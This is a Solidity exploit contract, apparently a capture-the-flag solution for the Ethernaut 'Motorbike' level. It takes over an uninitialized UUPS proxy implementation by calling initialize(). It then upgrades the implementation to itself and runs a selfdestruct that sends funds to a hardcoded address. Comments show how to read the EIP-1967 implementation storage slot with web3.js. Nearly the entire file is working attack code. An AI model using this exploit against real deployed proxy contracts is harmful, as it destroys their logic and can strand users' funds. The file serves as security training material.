// SPDX-License-Identifier: MIT
pragma solidity^0.8.0;


//minimal required interface for exploit
interface Engine{
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external;
}

//Get the address of the logic contract by manually querying the relevant storage slot of the contract via web3.js:
    //> let BN = await web3.utils.toBN("0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
    //> await web3.eth.getStorageAt(contract.address, BN) // <- result is address decoded as bytes32
    
contract MotorbikeExploit{
    
    address logicContractAddress;
    Engine engineInstance;
    
    constructor(address _address){
        logicContractAddress = _address;
        engineInstance = Engine(logicContractAddress);
    }

    function pwn() public{
        //I am becoming the owner of the actual contract
        engineInstance.initialize();

        //And can now upgrade to this contract and execute pwn2(), which contains the selfdestruct
        engineInstance.upgradeToAndCall(address(this), abi.encodeWithSignature("pwn2()"));

    }

    function pwn2() public {
        selfdestruct(payable(address(0x737e11E7A11A01891d2cB1b0A07C59A63dcd657C)));
    }
}